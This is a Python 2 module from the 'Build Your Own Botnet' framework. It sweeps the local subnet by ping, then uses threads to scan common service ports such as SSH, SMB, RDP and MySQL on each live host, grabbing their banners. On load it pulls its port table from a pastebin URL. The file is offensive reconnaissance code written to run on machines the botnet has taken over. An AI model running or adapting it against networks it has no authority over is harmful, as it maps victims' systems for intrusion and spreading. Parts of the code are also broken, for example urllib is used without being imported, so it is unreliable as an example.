#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard libarary
import os
import sys
import time
import json
import Queue
import socket
import random
import threading
import subprocess
import collections

# byob
import util

_ports  = json.loads(urllib.urlopen('https://pastebin.com/raw/BCjkh5Gh').read())
_scans  = {}
_tasks  = Queue.Queue()
_workers= {}

@util.progress_bar
def _threader(tasks):
    try:
        while True:
            try:
                method, task = tasks.get_nowait()
                if callable(method):
                    method(task)
                tasks.task_done()
            except Exception as e:
                util.debug(e)
                break
    except Exception as e:
        util.debug("{} error: {}".format(_threader.func_name, str(e)))

def ping(host):
    try:
        if host not in _scans:
            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                _scans[host] = {}
                return True
            else:
                return False
        else:
            return True
    except Exception as e:
        return False


def port(addr):
    try:
        host = str(addr[0])
        port = str(addr[1])
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        sock.connect((host,int(port)))
        data = sock.recv(1024)
        OpenPort = collections.namedtuple('OpenPort', ['port','protocol','service','state'])
        if data:
            info = _ports
            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
            data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...')
            item = {port: OpenPort(port, _ports[port]['protocol'], data, 'open')}
        else:
            item = {port: {'protocol': _ports[port]['protocol'], 'service': _ports[port]['service'], 'state': 'open'}}
        _scans.get(host).update(item)
    except (socket.error, socket.timeout):
        pass
    except Exception as e:
        util.debug('{} error: {}'.format(port.func_name, str(e)))


def scan(host):
    try:
        if ping(host):
            ports = [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8080,8443,8888]
            for p in ports:
                _tasks.put_nowait((port, (host, p)))
            for x in xrange(10):
                _workers['portscan-%d' % x] = threading.Thread(target=_threader, args=(_tasks,), name=time.time())
                _workers['portscan-%d' % x].daemon = True
                _workers['portscan-%d' % x].start()
            _tasks.join()
        return json.dumps(_scans)
    except Exception as e:
        util.debug('{} error: {}'.format(scan.func_name, str(e)))

def subnet(host=None):
    try:
        if not host:
            host = socket.gethostbyname(socket.gethostname())
        stub = '.'.join(str(host).split('.')[:-1]) + '.%d'
        _local  = []
        for i in xrange(1,255):
            _tasks.put_nowait((ping, stub % i))
        print('Scanning for online hosts in subnet {} - {}'.format(stub % 1, stub % 255))
        for _ in xrange(10):
            x = random.randrange(100)
            _workers['portscan-%d' % x] = threading.Thread(target=_threader, args=(_tasks,), name=time.time())
            _workers['portscan-%d' % x].setDaemon(True)
            _workers['portscan-%d' % x].start()
        _tasks.join()
        print('Found {} online hosts'.format(len(_scans)))
        print('Scanning for open ports')
        for ip in _scans:
            _tasks.put_nowait((scan, ip))
        for n in xrange(10):
            x = random.randrange(100)
            _workers['portscan-%d' % x] = threading.Thread(target=_threader, args=(_tasks,), name=time.time())
            _workers['portscan-%d' % x].start()
        _tasks.join()
        return json.dumps(_scans)
    except Exception as e:
        util.debug('{} error: {}'.format(subnet.func_name, str(e)))

